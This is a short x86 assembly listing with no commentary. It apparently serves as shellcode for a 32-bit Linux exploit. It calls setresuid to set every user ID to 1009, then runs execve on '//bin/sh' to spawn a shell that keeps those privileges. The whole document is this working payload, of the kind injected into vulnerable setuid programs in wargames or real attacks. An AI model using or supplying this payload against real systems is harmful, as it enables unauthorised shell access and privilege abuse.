.intel_syntax noprefix
.globl main

main:
xor eax, eax
push 0xd2
pop eax
push 1009
pop ecx
mov edx, ecx
mov ebx, ecx
int 0x80
xor ecx, ecx
mul ecx
push ecx
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
push ecx
push ebx
mov ecx, esp
mov al, 11
int 0x80
